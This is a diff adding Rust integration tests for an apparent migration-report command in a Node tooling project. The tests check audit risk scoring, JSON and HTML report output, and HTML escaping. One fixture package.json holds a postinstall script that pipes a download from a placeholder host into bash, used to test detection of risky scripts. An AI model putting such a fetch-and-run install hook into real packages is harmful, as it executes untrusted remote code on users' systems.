@@ -133,6 +133,180 @@ fn write_basic_rewrite_project(project_path: &Path) {
     .expect("write package manifest");
 }
 
+fn write_risky_report_project(project_path: &Path) {
+    std::fs::create_dir_all(project_path).expect("project dir");
+    std::fs::write(
+        project_path.join("index.js"),
+        "const fs = require(\"fs\");\nconsole.log(fs.existsSync(\"package.json\"));\n",
+    )
+    .expect("write js");
+    std::fs::write(
+        project_path.join("package.json"),
+        r#"{
+  "name": "demo-report",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl https://example.invalid/install.sh | bash"
+  }
+}
+"#,
+    )
+    .expect("write risky package manifest");
+}
+
+#[test]
+fn migrate_report_json_stdout_composes_audit_rewrite_validate_sections() {
+    let test_name = "migrate_report_json_stdout_composes_audit_rewrite_validate_sections";
+    let temp = TempDir::new().expect("temp dir");
+    let project_path = temp.path().join("project");
+    write_risky_report_project(&project_path);
+    let original_manifest =
+        std::fs::read_to_string(project_path.join("package.json")).expect("read package manifest");
+    log_phase(
+        test_name,
+        "fixtures_written",
+        serde_json::json!({"project_path": project_path.display().to_string()}),
+    );
+
+    let project_arg = project_path.to_string_lossy().to_string();
+    let output = run_cli(&["migrate-report", &project_arg, "--format", "json"]);
+    log_phase(
+        test_name,
+        "command_executed",
+        serde_json::json!({
+            "success": output.status.success(),
+            "status": output.status.code(),
+            "stdout_len": output.stdout.len(),
+            "stderr_len": output.stderr.len(),
+        }),
+    );
+    assert!(
+        output.status.success(),
+        "migrate-report --format json should produce a report even when validation is no-go: stdout={} stderr={}",
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr)
+    );
+    let payload = parse_json_stdout(&output, "migrate-report --format json");
+    log_phase(
+        test_name,
+        "stdout_json_parsed",
+        serde_json::json!({
+            "schema_version": payload["schema_version"],
+            "go_no_go": payload["executive_summary"]["go_no_go"],
+        }),
+    );
+    assert_eq!(
+        payload["schema_version"],
+        serde_json::json!("franken-node/migrate-report/v1")
+    );
+    assert_eq!(
+        payload["executive_summary"]["go_no_go"],
+        serde_json::json!("no_go")
+    );
+    assert!(
+        payload["executive_summary"]["risk_score"]
+            .as_u64()
+            .is_some_and(|score| score > 0),
+        "risk score should reflect the risky fixture: {payload:#?}"
+    );
+    assert_eq!(
+        payload["api_inventory"]["package_manifests"],
+        serde_json::json!(1)
+    );
+    assert_eq!(
+        payload["audit"]["summary"]["risky_scripts"],
+        serde_json::json!(1)
+    );
+    assert_eq!(
+        payload["rewrite_suggestions"]["apply_mode"],
+        serde_json::json!(false)
+    );
+    assert_eq!(payload["validation"]["status"], serde_json::json!("fail"));
+    let phase_names = payload["rollout_plan"]["phases"]
+        .as_array()
+        .expect("rollout phases array")
+        .iter()
+        .map(|phase| phase["name"].as_str().unwrap_or_default())
+        .collect::<Vec<_>>();
+    assert_eq!(phase_names, vec!["audit", "rewrite", "validate", "rollout"]);
+    assert_eq!(
+        std::fs::read_to_string(project_path.join("package.json")).expect("read package manifest"),
+        original_manifest,
+        "migrate-report must not apply rewrites while producing the report"
+    );
+}
+
+#[test]
+fn migrate_report_html_output_writes_escaped_report_file() {
+    let test_name = "migrate_report_html_output_writes_escaped_report_file";
+    let temp = TempDir::new().expect("temp dir");
+    let project_path = temp.path().join("project<demo&report>");
+    write_risky_report_project(&project_path);
+    let output_path = temp.path().join("reports/migration-report.html");
+    let project_arg = project_path.to_string_lossy().to_string();
+    let output_arg = output_path.to_string_lossy().to_string();
+    log_phase(
+        test_name,
+        "fixtures_written",
+        serde_json::json!({
+            "project_path": project_path.display().to_string(),
+            "output_path": output_path.display().to_string(),
+        }),
+    );
+
+    let output = run_cli(&[
+        "migrate-report",
+        &project_arg,
+        "--format",
+        "html",
+        "--output",
+        &output_arg,
+    ]);
+    log_phase(
+        test_name,
+        "command_executed",
+        serde_json::json!({
+            "success": output.status.success(),
+            "status": output.status.code(),
+            "stdout_len": output.stdout.len(),
+            "stderr_len": output.stderr.len(),
+        }),
+    );
+    assert!(
+        output.status.success(),
+        "migrate-report --format html --output failed: stdout={} stderr={}",
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr)
+    );
+    assert!(
+        output.stdout.is_empty(),
+        "HTML --output mode must not also emit stdout: {}",
+        String::from_utf8_lossy(&output.stdout)
+    );
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        stderr.contains("migration report written:") && stderr.contains(&output_arg),
+        "stderr should identify the written HTML report: {stderr}"
+    );
+    let html = std::fs::read_to_string(&output_path).expect("HTML report should be written");
+    log_phase(
+        test_name,
+        "html_artifact_checked",
+        serde_json::json!({"bytes": html.len()}),
+    );
+    assert!(html.contains("<section id=\"executive-summary\">"));
+    assert!(html.contains("<section id=\"rollout-plan\">"));
+    assert!(html.contains("go_no_go=no_go"));
+    assert!(
+        html.contains("project&lt;demo&amp;report&gt;"),
+        "project path should be HTML-escaped: {html}"
+    );
+    assert!(
+        !html.contains("project<demo&report>"),
+        "HTML report must not contain the raw unsafe project path: {html}"
+    );
+}
+
 #[test]
 fn migrate_audit_sarif_out_writes_artifact_without_stdout_payload() {
     let test_name = "migrate_audit_sarif_out_writes_artifact_without_stdout_payload";
